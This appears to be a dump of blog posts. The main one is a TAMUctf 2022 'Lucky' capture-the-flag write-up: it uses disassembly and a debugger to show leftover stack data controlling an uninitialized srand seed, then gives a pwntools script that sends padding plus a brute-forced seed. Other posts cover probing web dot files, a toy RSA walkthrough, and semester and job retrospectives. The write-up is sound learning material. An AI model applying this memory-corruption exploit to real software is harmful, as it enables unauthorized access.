aaaabaaacaaadaa =\u0026gt; 0x00005555555551d6 \u0026lt;+49\u0026gt;:\tlea rax,[rbp-0x10] 0x00005555555551da \u0026lt;+53\u0026gt;:\tmov rsi,rax # put the result as the second # argument to printf 0x00005555555551dd \u0026lt;+56\u0026gt;:\tlea rdi,[rip+0xe3c] # 0x555555556020 # rdi has the whole string that gets printed to the screen 0x00005555555551e4 \u0026lt;+63\u0026gt;:\tmov eax,0x0 0x00005555555551e9 \u0026lt;+68\u0026gt;:\tcall 0x555555555050 \u0026lt;printf@plt\u0026gt; # once printf gets called, the string now contains the buf 0x00005555555551ee \u0026lt;+73\u0026gt;:\tnop 0x00005555555551ef \u0026lt;+74\u0026gt;:\tleave 0x00005555555551f0 \u0026lt;+75\u0026gt;:\tret When I printed out info frame for welcome function, it gave me:\nStack level 0, frame at 0x7fffffffe180: rip = 0x5555555551b4 in welcome; saved rip = 0x5555555552df called by frame at 0x7fffffffe1a0 Arglist at 0x7fffffffe170, args: Locals at 0x7fffffffe170, Previous frame\u0026#39;s sp is 0x7fffffffe180 Saved registers: rbp at 0x7fffffffe170, rip at 0x7fffffffe178 So, the base pointer is at 170. Once fgets returns, its return values goes into rax and rax has 15 bytes of characters aaaabaaacaaadaa and one bye of null character. When the flow returns to the main function before calling seed function, rsi still has the output that was used by the welcome function (later I figured this didn\u0026rsquo;t really matter).\nDump of assembler code for function seed: 0x00005555555551f1 \u0026lt;+0\u0026gt;:\tpush rbp 0x00005555555551f2 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00005555555551f5 \u0026lt;+4\u0026gt;:\tsub rsp,0x10 0x00005555555551f9 \u0026lt;+8\u0026gt;:\tmovabs rax,0x443a2046484c47 0x0000555555555203 \u0026lt;+18\u0026gt;:\tmov QWORD PTR [rbp-0xc],rax 0x0000555555555207 \u0026lt;+22\u0026gt;:\tlea rax,[rbp-0xc] # this instruction overwrites some of the characters of aaaabaaacaaadaa # so, before, it was: # 0x7fffffffe160:\t0x61\t0x61\t0x61\t0x61\t0x62\t0x61\t0x61\t0x61 # 0x7fffffffe168:\t0x63\t0x61\t0x61\t0x61\t0x64\t0x61\t0x61\t0x00 # but after: # 0x7fffffffe160:\t0x61\t0x61\t0x61\t0x61\t0x47\t0x4c\t0x48\t0x46 # 0x7fffffffe168:\t0x20\t0x3a\t0x44\t0x00\t0x64\t0x61\t0x61\t0x00 0x000055555555520b \u0026lt;+26\u0026gt;:\tmov rdi,rax 0x000055555555520e \u0026lt;+29\u0026gt;:\tcall 0x555555555030 \u0026lt;puts@plt\u0026gt; # printf is replaced with puts by the compiler 0x0000555555555213 \u0026lt;+34\u0026gt;:\tmov eax,DWORD PTR [rbp-0x4] # this is where eax contains the return value of `lol` variable # rbp is 0x7fffffffe170 and subtracting 4 bytes gives us # 0x7fffffffe16c which I belive the start of `int lol` variable # if you examine the next four bytes from 0x7fffffffe16c, you can see # 0x7fffffffe16c:\t0x64\t0x61\t0x61\t0x00 # this is \u0026#39;daa\u0026#39; which is the last three characters from the stdin we entered earlier # (of course, this is shown with the little-endian format) # now we know that we can try to manipulate these four bytes with the value # that would make the condition satisfy so it would execute the win func =\u0026gt; 0x0000555555555216 \u0026lt;+37\u0026gt;:\tleave 0x0000555555555217 \u0026lt;+38\u0026gt;:\tret Since srand() is dictated by the return value of seed(), we would want to overwrite/manipulate the return value of seed() somehow.\nWhen seed() is being called and run, rsp ~ rsp+16 bytes still has some of the leftover strings from the win function and GLHF :D.\npwndbg\u0026gt; x/16cb $rsp 0x7fffffffe160:\t97 \u0026#39;a\u0026#39;\t97 \u0026#39;a\u0026#39;\t97 \u0026#39;a\u0026#39;\t97 \u0026#39;a\u0026#39;\t71 \u0026#39;G\u0026#39;\t76 \u0026#39;L\u0026#39;\t72 \u0026#39;H\u0026#39;\t70 \u0026#39;F\u0026#39; 0x7fffffffe168:\t32 \u0026#39; \u0026#39;\t58 \u0026#39;:\u0026#39;\t68 \u0026#39;D\u0026#39;\t0 \u0026#39;\\000\u0026#39;\t100 \u0026#39;d\u0026#39;\t97 \u0026#39;a\u0026#39;\t97 \u0026#39;a\u0026#39;\t0 \u0026#39;\\000\u0026#39; And, again, before the seed function returns, eax has 0x616164 which is daa in little-endian format.\nNow, we need to know the seed value that will satisfy the if condition to execute the win function.\nint key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026amp;\u0026amp; key1 \u0026amp;\u0026amp; key2) { win(); } int i = 0; while (1) { srand(i); int key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026amp;\u0026amp; key1 \u0026amp;\u0026amp; key2) { printf(\u0026#34;seed = %i\u0026#34;, i); exit(0); } else { i++; } After running the program, we know that the seed value must be 5649426. And we know daa is where we need to put the seed value in.\n12 bytes of string + 5649426\nWe can create a short python script that does this for us.\nimport pwn elf = pwn.context.binary = pwn.ELF(\u0026#34;./lucky\u0026#34;) #p = pwn.remote(\u0026#34;tamuctf.com\u0026#34;, 433, ssl=True, sni=\u0026#34;lucky\u0026#34;) p = pwn.process([\u0026#34;./lucky\u0026#34;]) payload = b\u0026#39;A\u0026#39;*12 payload += pwn.p64(5649426) p.sendline(payload) p.interactive() Result:\n[+] Starting local process \u0026#39;./lucky\u0026#39;: pid 132488 [*] Switching to interactive mode [*] Process \u0026#39;./lucky\u0026#39; stopped with exit code 0 (pid 132488) Enter your name: Welcome, AAAAAAAAAAAA\\x12V If you\u0026#39;re super lucky, you might get a flag! GLHF :D Nice work! Here\u0026#39;s the flag: flag ","permalink":"https://joonkim0625.github.io/posts/2022-4-20-tamuctf2022-lucky/","summary":"\u003ch1 id=\"tamuctf-2022-lucky\"\u003etamuctf 2022: Lucky\u003c/h1\u003e\n\u003cp\u003eAuthor: nhwn\u003c/p\u003e\n\u003cp\u003eFeeling lucky? I have just the challenge for you :D\u003c/p\u003e\n\u003ch2 id=\"reference\"\u003eReference\u003c/h2\u003e\n\u003cp\u003eI could not solve this on my own so I had to refer to this writeup:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky\"\u003ehttps://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewelcome\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e buf[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Enter your name: \u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efgets\u003c/span\u003e(buf, \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(buf), stdin);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eWelcome, %s\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eIf you\u0026#39;re super lucky, you might get a flag! \u0026#34;\u003c/span\u003e, buf);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eseed\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e msg[] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GLHF :D\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, msg);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e lol;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e lol;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewin\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e flag[\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    FILE\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e f \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efopen\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;flag.txt\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e(flag, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(flag), f);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Nice work! Here\u0026#39;s the flag: %s\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, flag);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esetvbuf\u003c/span\u003e(stdout, NULL, _IONBF, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ewelcome\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esrand\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eseed\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e key0 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erand\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e306291429\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e key1 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erand\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e442612432\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e key2 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erand\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e110107425\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (key0 \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e key1 \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e key2) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ewin\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Looks like you weren\u0026#39;t lucky enough. Better luck next time!\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIn \u003ccode\u003ewelcome()\u003c/code\u003e function, before \u003ccode\u003efgets\u003c/code\u003e gets called, \u003ccode\u003erbp-0x10\u003c/code\u003e which is the address\nto \u003ccode\u003ebuf\u003c/code\u003e is loaded into \u003ccode\u003erax\u003c/code\u003e. I passed in \u003ccode\u003eaaaabaaacaaadaaaeaaafaaag\u003c/code\u003e, the\nbuffer was filled with \u003ccode\u003eaaaabaaacaaadaa\\0\u003c/code\u003e.\u003c/p\u003e","title":"tamuctf 2022 - Lucky"},{"content":"picoCTF: Scavenger Hunt Things I learned from this challenge:\nTry to access those dot files! And other files that might be accessible other than the public ones.\nrobots.txt - https://developers.google.com/search/docs/advanced/robots/intro\nApache server manages its server permissions in .htaccess file.\nIt is always good to know what options I have to find vulnerabilities.\n","permalink":"https://joonkim0625.github.io/posts/2022-3-04-picoctf-scavenger-hunt/","summary":"\u003ch1 id=\"picoctf-scavenger-hunt\"\u003epicoCTF: Scavenger Hunt\u003c/h1\u003e\n\u003cp\u003eThings I learned from this challenge:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eTry to access those dot files! And other files that might be accessible other\nthan the public ones.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003erobots.txt\u003c/code\u003e - \u003ca href=\"https://developers.google.com/search/docs/advanced/robots/intro\"\u003ehttps://developers.google.com/search/docs/advanced/robots/intro\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eApache server manages its server permissions in \u003ccode\u003e.htaccess\u003c/code\u003e file.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eIt is always good to know what options I have to find vulnerabilities.\u003c/p\u003e","title":"picoCTF - Scavenger Hunt"},{"content":"RSA Encryption I was working on picoCTF 2021: Mind your Ps and Qs problem and the problem was about decrypting a RSA encryption. I have used RSA encryption to create some SSH keys. And, of course, there are many times that I just don\u0026rsquo;t realize but RSA encryption is being used under the hood. So, I wanted to know about how it would actually work. I watched this Youtube video by Eddie Woo and it was really helpful!\nHow RSA works:\nPair of numbers is needed for encryption. This is published by me. If you want to send me a message, use that pair of keys to encrypt your message. I am the only one who can decrypt the message. Let\u0026rsquo;s say the public key I have published is (5, 14). Someone wants to send me a message \u0026lsquo;B\u0026rsquo; which can be a value of 2 numerically (A -\u0026gt; 1, B -\u0026gt; 2, C -\u0026gt; 3, and so on).\nWe want to raise the value 2 to the power of the first number from the public key and mod it by the second number. It can be written as $2^5$ (mod 14). This will give us 32 (mod 14). The remainder should be 4 (32 % 28).\nThe ciphertext is 4 and this is a letter \u0026lsquo;D\u0026rsquo;. How do I decrypt this message? Let\u0026rsquo;s say I have my secret key of (11, 14). The process of decrypting the message is to take the numerical value of \u0026lsquo;D\u0026rsquo; and go through the same process as the encryption process.\n$4^11$ (mod 14) =\u0026gt; 4194304 (mod 14) = 2. So we have the original text \u0026lsquo;B\u0026rsquo;!\nBut, how do we come up with my secret key that matches the public key?\nWe need to pick two prime numbers! Of course, the two prime numbers will be very very large compared to the numbers that are used here in this example. Here, p = 2, q = 7 are selected. And they should be kept secret!\nN = p * q = 14. This number becomes the modulo of the encryption key and the decryption key.\nWe are going to have to choose a number that does not share a common factor with 14 (between 1 and 14). Let\u0026rsquo;s not worry about 1 since it is a factor for all the numbers. 2 should not be considered since it has a common factor with 14 which is \u0026lsquo;2\u0026rsquo;. This allows us to not consider all the even numbers. 7 should not be considered as it also shares a common factor with 14. The leftover numbers are now 1, 3, 5, 9, 11, 13. These numbers are called \u0026lsquo;coprime\u0026rsquo; numbers with 14. The count of these numbers is 6. 6 is going to be our $\\phi$(N) value. But, this 6 can be easily calculated by (p-1)(q-1)!! (2-1)(7-1) = 6.\nNow, we need to pick a number for the first number for the encryption key. We are going to call it \u0026rsquo;e\u0026rsquo; for encryption. To choose a number of \u0026rsquo;e\u0026rsquo;, it has to obey some properties. 1. \u0026rsquo;e\u0026rsquo; has to be a number that is $1 \u0026lt; e \u0026lt; \\phi (N)$. 2. The number must be coprime with N, $\\phi(N)$. So, after the first property, we only have 2, 3, 4, 5 (since phi is 6). What would be the number that can be coprime with 6, 14? That number is 5. So, this was how 5 was selected as the first number for the public key. With our N, we have the public key of (5, 14).\nNow, we need to choose \u0026rsquo;d\u0026rsquo; value for decryption. We are going to choose a number such that is $de(mod \\phi(N)) = 1$. This can be re-written as $5d(mod 6) = 1$. Since it is a multiple of 5, the pattern of the multiple is going to be 5, 10, 15, 20, 25, 30 \u0026hellip; The corresponding remainder when it is moded by 6 is 5, 4, 3, 2, 1, 0. We can pick any numbers that we get 1! So, the decryption is key (11, 14) and 11 was selected (or could be a candidate of the first part) was because 5*11 (mod 6) = 1. It is obvious that we want to choose a large number to make computations harder.\nThis short example by Eddie Woo was very helpful for me to understand how RSA encryption decides the public key and the decryption key.\n","permalink":"https://joonkim0625.github.io/posts/2022-1-27-rsa-encryption/","summary":"\u003ch1 id=\"rsa-encryption\"\u003eRSA Encryption\u003c/h1\u003e\n\u003cp\u003eI was working on picoCTF 2021: Mind your Ps and Qs problem and the problem was\nabout decrypting a RSA encryption. I have used RSA encryption to create some SSH\nkeys. And, of course, there are many times that I just don\u0026rsquo;t realize but RSA\nencryption is being used under the hood. So, I wanted to know about how it would\nactually work. I watched this \u003ca href=\"https://www.youtube.com/watch?v=4zahvcJ9glg\"\u003eYoutube video\u003c/a\u003e by Eddie Woo and it was really helpful!\u003c/p\u003e","title":"RSA Encryption"},{"content":"This semester was very different than the previous semesters that I had in college. Not being able to attend classes and interact with people for about a year and a half seemed to have some kind of an impact that I did not realize that I was having. Maybe that is why I was actually excited to come back to campus! Obviously, things were much different - wearing a mask on campus, supporting remote learning for the majority of classes, and another year of online career fairs.\nAlthough I told myself to keep the blog active during this semester, once I started to get busy, I just could not find time to update my blog\u0026hellip; So, I wanted to take some time to write down what I have done this semester and what went well and what went not so well.\nClasses I took Csci 5103: Operating Systems I was very excited to take this class as I have always been interested in the OS. In this class, I learned about how the operating systems work under the hood: what algorithms they run to manage processes and schedule them. Also, I learned how to manage process coordination, synchronization, and handle/prevent deadlocks. We also did an assignment on the Linux device driver programming in which we created a buffer into the kernel\u0026rsquo;s memory space and multiple producers and consumers keep trying to access the buffer to do their jobs (basically a producer-consumer problem in the kernel memory space). The page tables and virtual memory weren\u0026rsquo;t so easy to understand still!!\nCsci 5451: Introduction to Parallel Computing Before taking this class, I had only heard about the term \u0026lsquo;Parallel Computing\u0026rsquo; but never knew how it would be implemented. I had some experience working on some projects that use the shared memory space to let different threads work together (use/update data in the shared space). However, in order to have much more powerful computing power, there need to be many computers that are connected through some type of network topology and they need to share data through that network to work together. We got to use some of the libraries (OpenMPI, OpenMP, and CUDA for GPU programming) that are created for this purpose. They did make our lives much easier when it came to synchronizing multiple processors that do not live in the same hardware. I got to know the notion of data dependency between parallelized works, where we can parallelize the work (or where we should not), and having many processors work together does not mean an increase in performance always (obviously, there will be overheads by having more processors as they must communicate more).\nCsci 4211: Computer Networks This was another class that I was excited to take until I knew there were just so many things that I had to learn. The number of topics that were covered in each session was so much that I was sometimes overwhelmed just to go through all the materials. Learning about technologies that we use every day without much thinking and seeing how they are implemented was very cool. From packet switching/circuit switching to how this Internet world is working (the relationships of providers, peers, and consumers), there were many topics that were covered in this class. Hopefully, this class had me prepared for the advanced network class I will be taking this spring.\nThings I did Besides taking classes, it was a TA for the \u0026lsquo;Machine Architecture and its organizations\u0026rsquo; class. This is one of the classes that students find somewhat challenging because we use C and Assembly programming languages. Also, now they have to think about the lower level of implementations as this class covers some of the machine architecture aspects (CPUs, cache, RAM, secondary storage, and etc.). Programming in Assembly is not easy as debugging is not easy and there are many details that we have to consider (which register are we going to use or are we using the right instructions to do things?).\nHelping others taught me a lot because I had to make sure that the information I am about to deliver to other students is correct. So, that forced me to study and take one more look at materials before answering questions. There were definitely materials that I understand better now than I did last year.\nWhat went right? I want to say many things went right! I did my best in classes, I got to know more people, and my intramural basketball team was one of the last four teams. And the decision to drop one of the classes that I struggled with so much was great too. It is never easy to let things go. Also, asking for help when I didn\u0026rsquo;t know about things whether they were class-related or they were just general things helped me so much. I believe that asking for help (and when to ask for help) is very important!\nWhat went wrong? The last two weeks of school were very tough as four different assignments were due at the end of the semester. And trying to finish those assignments definitely impacted that I could not focus on the latter part of the class as much. What could I have done differently? I feel like I spent too much time on one thing when I should just have moved on to the next task. As I mentioned above, sometimes letting something go (or knowing when to move on) can be the hardest thing to do. I need to work on that more!\nSo, how was my semester? This was my first semester to take graduate-level courses here at the U and they were fun (although they were challenging). And my TA experience was not so bad! I think I did okay considering that it was my first time TAing. There are definitely things that I can improve and I am confident that I will do a better job next time. As I learn more, I feel like there are even more things that I don\u0026rsquo;t know. The beauty of this field is that you will have to keep learning otherwise you will fall behind!\nI just want to pet myself on the back and get some rest. Happy holidays!\n","permalink":"https://joonkim0625.github.io/posts/2021-12-23-retro-on-21fall-semester/","summary":"\u003cp\u003eThis semester was very different than the previous semesters that I had in\ncollege. Not being able to attend classes and interact with people for about a\nyear and a half seemed to have some kind of an impact that I did not realize\nthat I was having. Maybe that is why I was actually excited to come back to\ncampus! Obviously, things were much different - wearing a mask on campus,\nsupporting remote learning for the majority of classes, and another year of\nonline career fairs.\u003c/p\u003e","title":"Retrospective on Fall 2021 Semester"},{"content":"Last Day of Work Today, I finished my student work at Academic Support Resources (ASR) Custom Solutions where I worked as a web developer for a year. Due to the pandemic, everything was done remotely. There are so many things that I learned by working with professional developers and I want to write down some of them.\nAgile Methodology The Agile way of work was something that I would always hear about, but I was never involved with. According to Atlassian, it is \u0026ldquo;an iterative approach to project management and software development that helps teams deliver value to their customers faster and with fewer headaches.\u0026rdquo; - What is Agile?\nThe team used the Scrum framework and this was also something that I was never exposed to before. The team worked based on sprints and had regular meetings to do weekly retrospectives. Also, there were regular weekly meetings with our customers to show what we had at the moment and listen to their opinions on the implementations of ongoing projects.\nPair Programming - What is Pair Programming? Whenever I worked, the majority of the time, I got to pair-program with other developers! At first, I was very nervous and was very worried because I lacked experience and knowledge in web development. However, soon I realized that pair programming can be very beneficial to a developer with less experience or skills (which is me).\nBenefits that I got from pair programmings are:\nI was able to ask a lot of questions! I think this is the most beneficial thing about pair programming. Not only did it take much less to find out about an answer, but also the answers were very precise and high quality. This led me to write better code that followed good practices. Sometimes it is not always about writing code. When pair programming with others, there are many things to consider. One of the things is that you have to be able to respect others\u0026rsquo; time. There can be time conflicts when you want to work with someone. Or, you pair-program for too long without any break time. These are the things that must be considered when working with others (not just when pair programming). As mentioned above, it isn\u0026rsquo;t all about coding - you have to be able to listen too. I tended to cut off when someone was talking. However, others would wait until I finished and then spoke. As mentioned above, I had many questions. But, I also realized that I could have waited until my co-workers finished their talks. Working with Customers Having a regular meeting schedule helped us work on the web application a lot. Being able to update on the work progress and get feedback frequently definitely prevented us from going in the wrong direction. And we didn\u0026rsquo;t have to worry about scheduling for meetings as the times were fixed and it only required a short period of time.\nSo\u0026hellip; These are the major benefits/lessons that I got from working in an environment that the ASR team pursued. Obviously, the team was small - we had about eight developers plus two student developers. So the Agile way of working could work perfectly for the team in my opinion. There are definitely more things (retrospective, professional development time) that I can write about my experience and I will try to add them in the future. What a year I had with the team! I was very lucky to be a part of the team and was glad to help the team and the school community that I belonged to.\nThanks for reading!\n","permalink":"https://joonkim0625.github.io/posts/2021-08-27-retro-on-work/","summary":"\u003ch1 id=\"last-day-of-work\"\u003eLast Day of Work\u003c/h1\u003e\n\u003cp\u003eToday, I finished my student work at Academic Support Resources (ASR) Custom\nSolutions where I worked as a web developer for a year. Due to the pandemic,\neverything was done remotely. There are so many things that I learned by working\nwith professional developers and I want to write down some of them.\u003c/p\u003e\n\u003ch2 id=\"agile-methodology\"\u003eAgile Methodology\u003c/h2\u003e\n\u003cp\u003eThe Agile way of work was something that I would always hear about, but I was\nnever involved with. According to Atlassian, it is \u0026ldquo;an iterative approach to\nproject management and software development that helps teams deliver value to\ntheir customers faster and with fewer headaches.\u0026rdquo; - \u003ca href=\"https://www.atlassian.com/agile\"\u003eWhat is Agile?\u003c/a\u003e\u003c/p\u003e","title":"My Retrospective on Working for The ASR Team"},{"content":"I was crazy enough to choose Arch Linux as my first Linux distro to start with - when a lot of people recommend choosing user-friendly distros to begin with. From creating a bootable USB to deciding what kind of programs to install so I can have my laptop work, it took a very long time.\nThen, somehow, I got into this thinking that I didn\u0026rsquo;t want to have a desktop environment (DE) installed but wanted to install a window manager only! This, of course, was me refusing all the 